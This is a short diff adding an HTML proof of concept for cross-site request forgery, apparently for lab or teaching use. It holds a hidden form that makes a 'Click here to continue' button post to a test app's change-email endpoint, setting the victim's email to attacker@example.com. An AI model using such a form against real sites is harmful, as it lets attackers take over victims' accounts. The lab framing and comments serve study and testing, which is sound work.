@@ -1,0 +1,9 @@
+<!-- CSRF PoC (educational purpose only, safe for lab use) -->
+
+<form action="https://test-app.local/my-account/change-email?_method=POST" method="POST">
+  <input type="hidden" name="newEmail" value="attacker@example.com">
+  <input type="submit" value="Click here to continue">
+</form>
+
+<!-- This simulates an attack from an attacker-controlled site -->
+<!-- Real attack vectors and session cookies are excluded -->
